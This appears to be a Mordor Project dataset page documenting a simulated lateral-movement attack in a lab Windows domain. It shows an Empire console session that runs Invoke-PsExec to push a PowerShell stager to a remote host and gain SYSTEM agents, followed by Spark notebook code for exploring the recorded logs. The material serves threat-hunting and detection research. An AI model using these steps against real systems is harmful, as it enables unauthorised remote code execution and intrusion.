

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta charset="utf-8" />
    <title>Empire Invoke PsExec &#8212; Mordor Project</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
    <link href="../../../../_static/css/index.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../_static/sphinx-book-theme.css" type="text/css" />
    <link rel="stylesheet" href="../../../../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/togglebutton.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/copybutton.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/mystnb.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/jupyter-sphinx.css" />
    <script id="documentation_options" data-url_root="../../../../" src="../../../../_static/documentation_options.js"></script>
    <script src="../../../../_static/sphinx-book-theme.js"></script>
    <script src="../../../../_static/jquery.js"></script>
    <script src="../../../../_static/underscore.js"></script>
    <script src="../../../../_static/doctools.js"></script>
    <script src="../../../../_static/language_data.js"></script>
    <script src="../../../../_static/togglebutton.js"></script>
    <script src="../../../../_static/clipboard.min.js"></script>
    <script src="../../../../_static/copybutton.js"></script>
    <script src="../../../../_static/mystnb.js"></script>
    <script src="../../../../_static/sphinx-book-theme.js"></script>
    <script >var togglebuttonSelector = '.toggle, .secondtoggle, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
    <script src="https://unpkg.com/@jupyter-widgets/html-manager@^0.18.0/dist/embed.js"></script>
    <script async="async" src="https://unpkg.com/thebelab@latest/lib/index.js"></script>
    <script async="async" src="../../../../_static/thebelab.js"></script>
    <link rel="canonical" href="https://mordordatasets.com/notebooks/small/windows/08_lateral_movement/SD-190518210652.html" />
    <link rel="shortcut icon" href="../../../../_static/favicon.ico"/>
    <link rel="index" title="Index" href="../../../../genindex.html" />
    <link rel="search" title="Search" href="../../../../search.html" />

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="docsearch:language" content="en">
<!-- Put requirejs at the end so it's always after bootstrap -->
<!-- TODO: remove this once https://github.com/pandas-dev/pydata-sphinx-theme/pull/149 is merged -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.6/require.min.js"></script>


<!-- Opengraph tags -->
<meta property="og:url"         content="https://mordordatasets.com/notebooks/small/windows/08_lateral_movement/SD-190518210652.html" />
<meta property="og:type"        content="article" />
<meta property="og:title"       content="Empire Invoke PsExec" />
<meta property="og:description" content="Empire Invoke PsExec  Metadata          id  SD-190518210652  author  Roberto Rodriguez @Cyb3rWard0g  creation date  2019/05/18  platform  Windows  Mordor Enviro" />
<meta property="og:image"       content="https://mordordatasets.com/_static/logo.png" />

<meta name="twitter:card" content="summary">


  </head>
  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
    

    <div class="container-xl">
      <div class="row">
          

<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
    <div class="navbar-brand-box">
<a class="navbar-brand text-wrap" href="../../../../index.html">
  
  <img src="../../../../_static/logo.png" class="logo" alt="logo">
  
  
  <h1 class="site-logo" id="site-title">Mordor Project</h1>
  
</a>
</div>

<form class="bd-search d-flex align-items-center" action="../../../../search.html" method="get">
  <i class="icon fas fa-search"></i>
  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
</form>

<nav class="bd-links" id="bd-docs-nav" aria-label="Main navigation">
  
  <ul class="nav sidenav_l1">
<li class="navbar-special">
<p class="margin-caption">Mordor Environments</p>
</li>
  <li class="">
    <a href="../../../../mordor_shire.html">The Shire</a>
  </li>
  <li class="">
    <a href="../../../../mordor_erebor.html">Erebor</a>
  </li>
<li class="navbar-special">
<p class="margin-caption">How To</p>
</li>
  <li class="">
    <a href="../../../../export_mordor.html">Create Mordor Datasets</a>
  </li>
  <li class="">
    <a href="../../../../import_mordor.html">Consume Mordor Datasets</a>
  </li>
<li class="navbar-special">
<p class="margin-caption">Events</p>
</li>
  <li class="">
    <a href="../../../../mordor_events.html">Mordor Events!</a>
  </li>
<li class="navbar-special">
<p class="margin-caption">Small Mordor Datasets</p>
</li>
  <li class="">
    <a href="../windows.html">Windows</a>
  </li>
  <li class="">
    <a href="../../linux/linux.html">Linux</a>
  </li>
  <li class="">
    <a href="../../mac/mac.html">MAC</a>
  </li>
</ul>
</nav>
<p class="navbar_footer">Powered by <a href="https://jupyterbook.org">Jupyter Book</a></p>
</div>


          


          
<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
    
    <div class="row topbar fixed-top container-xl">
    <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show">
    </div>
    <div class="col pl-2 topbar-main">
        
        <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse" data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu" aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation" title="Toggle navigation" data-toggle="tooltip" data-placement="left">
            <i class="fas fa-bars"></i>
            <i class="fas fa-arrow-left"></i>
            <i class="fas fa-arrow-up"></i>
        </button>
        <div class="dropdown-buttons-trigger">
            <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i class="fas fa-download"></i></button>

            
            <div class="dropdown-buttons">
                <!-- ipynb file if we had a myst markdown file -->
                
                <!-- Download raw file -->
                <a class="dropdown-buttons" href="../../../../_sources/notebooks/small/windows/08_lateral_movement/SD-190518210652.ipynb.txt"><button type="button" class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip" data-placement="left">.ipynb</button></a>
                <!-- Download PDF via print -->
                <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF" onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
            </div>
            
        </div>

        <!-- Edit this page -->
        <a class="edit-button" href="https://github.com/OTRF/mordor/edit/master/docs/notebooks/small/windows/08_lateral_movement/SD-190518210652.ipynb"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="bottom" title="Edit this page"><i class="fas fa-pencil-alt"></i></button></a>

        <!-- Full screen (wrap in <a> to have style consistency -->
        <a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="bottom" onclick="toggleFullScreen()" title="Fullscreen mode"><i class="fas fa-expand"></i></button></a>

        <!-- Launch buttons -->
        
        <div class="dropdown-buttons-trigger">
            <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Launch interactive content"><i class="fas fa-rocket"></i></button>
            <div class="dropdown-buttons">
                
                <a class="binder-button" href="https://mybinder.org/v2/gh/OTRF/mordor/master?urlpath=tree/docs/notebooks/small/windows/08_lateral_movement/SD-190518210652.ipynb"><button type="button" class="btn btn-secondary topbarbtn" title="Launch Binder" data-toggle="tooltip" data-placement="left"><img class="binder-button-logo" src="../../../../_static/images/logo_binder.svg" alt="Interact on binder">Binder</button></a>
                
                
                <button type="button" class="btn btn-secondary topbarbtn thebelab-launch-button" onclick="initThebelab()" title="Launch Thebelab" data-toggle="tooltip" data-placement="left"><i class="fas fa-rocket"></i><span style="margin-left: .4em;">ThebeLab</span></button>
                
            </div>
        </div>
        

        
    </div>
    <div class="d-none d-md-block col-md-2 bd-toc show">
<div class="tocsection onthispage pt-5 pb-3">
    <i class="fas fa-list"></i> On this page
</div>

<nav id="bd-toc-nav">
    <ul class="nav section-nav flex-column">
    
        <li class="nav-item toc-entry toc-h2">
            <a href="#metadata" class="nav-link">Metadata</a>
        </li>
    
        <li class="nav-item toc-entry toc-h2">
            <a href="#dataset-description" class="nav-link">Dataset Description</a>
        </li>
    
        <li class="nav-item toc-entry toc-h2">
            <a href="#adversary-view" class="nav-link">Adversary View</a>
        </li>
    
        <li class="nav-item toc-entry toc-h2">
            <a href="#explore-mordor-dataset" class="nav-link">Explore Mordor Dataset</a><ul class="nav section-nav flex-column">
                
        <li class="nav-item toc-entry toc-h3">
            <a href="#initialize-analytics-engine" class="nav-link">Initialize Analytics Engine</a>
        </li>
    
        <li class="nav-item toc-entry toc-h3">
            <a href="#download-process-mordor-file" class="nav-link">Download & Process Mordor File</a>
        </li>
    
        <li class="nav-item toc-entry toc-h3">
            <a href="#get-to-know-your-data" class="nav-link">Get to know your data</a>
        </li>
    
            </ul>
        </li>
    
    </ul>
</nav>



<div class="tocsection editthispage">
    <a href="https://github.com/OTRF/mordor/edit/master/docs/notebooks/small/windows/08_lateral_movement/SD-190518210652.ipynb">
        <i class="fas fa-pencil-alt"></i> Edit this page
    </a>
</div>

    </div>
</div>
    <div id="main-content" class="row">
        <div class="col-12 col-md-9 col-xxl-7 pl-md-3 pr-md-0">
        
              <div>
                
  <div class="section" id="empire-invoke-psexec">
<h1>Empire Invoke PsExec<a class="headerlink" href="#empire-invoke-psexec" title="Permalink to this headline">¶</a></h1>
<div class="section" id="metadata">
<h2>Metadata<a class="headerlink" href="#metadata" title="Permalink to this headline">¶</a></h2>
<table class="colwidths-auto table">
<thead>
<tr class="row-odd"><th class="text-align:left head"><p></p></th>
<th class="text-align:left head"><p></p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td class="text-align:left"><p>id</p></td>
<td class="text-align:left"><p>SD-190518210652</p></td>
</tr>
<tr class="row-odd"><td class="text-align:left"><p>author</p></td>
<td class="text-align:left"><p>Roberto Rodriguez &#64;Cyb3rWard0g</p></td>
</tr>
<tr class="row-even"><td class="text-align:left"><p>creation date</p></td>
<td class="text-align:left"><p>2019/05/18</p></td>
</tr>
<tr class="row-odd"><td class="text-align:left"><p>platform</p></td>
<td class="text-align:left"><p>Windows</p></td>
</tr>
<tr class="row-even"><td class="text-align:left"><p>Mordor Environment</p></td>
<td class="text-align:left"><p>shire</p></td>
</tr>
<tr class="row-odd"><td class="text-align:left"><p>Simulation Type</p></td>
<td class="text-align:left"><p>C2</p></td>
</tr>
<tr class="row-even"><td class="text-align:left"><p>Simulation Tool</p></td>
<td class="text-align:left"><p>Empire</p></td>
</tr>
<tr class="row-odd"><td class="text-align:left"><p>Simulation Script</p></td>
<td class="text-align:left"><p>https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-PsExec.ps1</p></td>
</tr>
<tr class="row-even"><td class="text-align:left"><p>Mordor Dataset</p></td>
<td class="text-align:left"><p>https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/empire_invoke_psexec.tar.gz</p></td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="dataset-description">
<h2>Dataset Description<a class="headerlink" href="#dataset-description" title="Permalink to this headline">¶</a></h2>
<p>This dataset represents adversaries executing malicious code remotely psexec style</p>
</div>
<div class="section" id="adversary-view">
<h2>Adversary View<a class="headerlink" href="#adversary-view" title="Permalink to this headline">¶</a></h2>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(Empire: V6W3TH8Y) &gt; usemodule lateral_movement/invoke_psexec
(Empire: powershell/lateral_movement/invoke_psexec) &gt; 
(Empire: powershell/lateral_movement/invoke_psexec) &gt; info

              Name: Invoke-PsExec
            Module: powershell/lateral_movement/invoke_psexec
        NeedsAdmin: False
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: True
  OutputExtension: None

Authors:
  @harmj0y

Description:
  Executes a stager on remote hosts using PsExec type
  functionality.

Comments:
  https://github.com/rapid7/metasploit-
  framework/blob/master/tools/psexec.rb

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  Listener     False                                 Listener to use.                        
  ProxyCreds   False       default                   Proxy credentials                       
                                                    ([domain\]username:password) to use for 
                                                    request (default, none, or other).      
  ComputerName True                                  Host[s] to execute the stager on, comma 
                                                    separated.                              
  ServiceName  True        Updater                   The name of the service to create.      
  Command      False                                 Custom command to execute on remote     
                                                    hosts.                                  
  Proxy        False       default                   Proxy to use for request (default, none,
                                                    or other).                              
  UserAgent    False       default                   User-agent string to use for the staging
                                                    request (default, none, or other).      
  Agent        True        V6W3TH8Y                  Agent to run module on.                 
  ResultFile   False                                 Name of the file to write the results to
                                                    on agent machine.                       

(Empire: powershell/lateral_movement/invoke_psexec) &gt; set Listener https
(Empire: powershell/lateral_movement/invoke_psexec) &gt; set ComputerName IT001.shire.com
(Empire: powershell/lateral_movement/invoke_psexec) &gt; execute
[&gt;] Module is not opsec safe, run? [y/N] y
[*] Tasked V6W3TH8Y to run TASK_CMD_JOB
[*] Agent V6W3TH8Y tasked with task ID 2
[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_psexec
(Empire: powershell/lateral_movement/invoke_psexec) &gt; Job started: 9GY4PC
[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent EXBNZYTS checked in
[+] Initial agent EXBNZYTS from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to EXBNZYTS at 10.0.10.103

(Empire: powershell/lateral_movement/invoke_psexec) &gt; 
(Empire: powershell/lateral_movement/invoke_psexec) &gt; agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 21:07:43  https           
TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 21:07:42  https           
EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 21:07:44  https           

V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 21:07:42  https           
XSZ91N7T ps 172.18.39.105   IT001             *SHIRE\SYSTEM           powershell         4172   5/0.0    2019-05-18 21:07:43  https           
EXBNZYTS ps 172.18.39.105   IT001             *SHIRE\SYSTEM           powershell         6728   5/0.0    2019-05-18 21:07:42  https           


(Empire: agents) &gt;  
</pre></div>
</div>
</div>
<div class="section" id="explore-mordor-dataset">
<h2>Explore Mordor Dataset<a class="headerlink" href="#explore-mordor-dataset" title="Permalink to this headline">¶</a></h2>
<div class="section" id="initialize-analytics-engine">
<h3>Initialize Analytics Engine<a class="headerlink" href="#initialize-analytics-engine" title="Permalink to this headline">¶</a></h3>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">openhunt.mordorutils</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">spark</span> <span class="o">=</span> <span class="n">get_spark</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="download-process-mordor-file">
<h3>Download &amp; Process Mordor File<a class="headerlink" href="#download-process-mordor-file" title="Permalink to this headline">¶</a></h3>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/empire_invoke_psexec.tar.gz&quot;</span>
<span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="get-to-know-your-data">
<h3>Get to know your data<a class="headerlink" href="#get-to-know-your-data" title="Permalink to this headline">¶</a></h3>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
    <span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT *</span>
<span class="sd">FROM mordorTable</span>
<span class="sd">    &#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">printSchema</span><span class="p">()</span>
        
</pre></div>
</div>
</div>
</div>
</div>
</div>
</div>

    <script type="text/x-thebe-config">
    {
        requestKernel: true,
        binderOptions: {
            repo: "OTRF/mordor",
            ref: "master",
        },
        codeMirrorConfig: {
            theme: "abcdef",
            mode: "python"
        },
        kernelOptions: {
            kernelName: "python3",
            path: "notebooks/small/windows/08_lateral_movement"
        }
    }
    </script>
    <script>kernelName = 'python3'</script>

              </div>
              
        </div>
    </div>
    
    
    <div class='prev-next-bottom'>
        

    </div>
    <footer class="footer mt-5 mt-md-0">
  <div class="container">
    <p>
          &copy; Copyright 2020.<br/>
        Created using <a href="http://sphinx-doc.org/">Sphinx</a> 2.4.1.<br/>
    </p>
  </div>
</footer>
</main>


      </div>
    </div>

    <script src="../../../../_static/js/index.js"></script>
    
  </body>
</html>
